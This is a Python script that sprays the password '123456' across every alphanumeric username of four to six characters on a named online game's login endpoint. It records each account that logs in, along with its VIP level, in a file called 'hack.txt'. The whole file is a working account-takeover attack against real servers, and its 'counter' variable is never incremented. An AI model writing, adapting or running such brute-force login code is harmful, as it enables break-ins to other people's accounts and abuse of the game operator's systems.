import requests, json, itertools
if __name__ == "__main__":
    url = "http://uc.game.baozouwushuang.com/index.php?&c=user&m=login&&token=&channel=9&lang=zh-cn&rand=158862535321135&u={}&p=123456"
    pool = "1234567890abcdefghijklmnopqrstuvwxyz"
    login_url = "http://bzws-s32.game.zhanyougame.com/index.php?v=0&c=login&&m=user&&token=&channel=9&lang=zh-cn&rand=158862708903449&u={}&p=123456"
    file = open("hack.txt",'w')
    record = open("record.txt","w")
    counter = 0
    for i in range(4,7):

        for item in itertools.product(pool,repeat=i):
            print(item)
            u = "".join(list(item))
            res = requests.post(url.format(u)).content.decode()
            status = int(json.loads(res)['status'])
            if status == 1:
                res = requests.post(login_url.format(u))
                vip = json.loads(res.content.decode())['vip']
                file.write(u + " " + "123456 " + str(vip) + " \n")
                file.flush()
            elif status == -2:
                file.write(u + "\n" )
                file.flush()
            if counter % 10000 == 0:
                record.write(str(counter))
                record.flush()

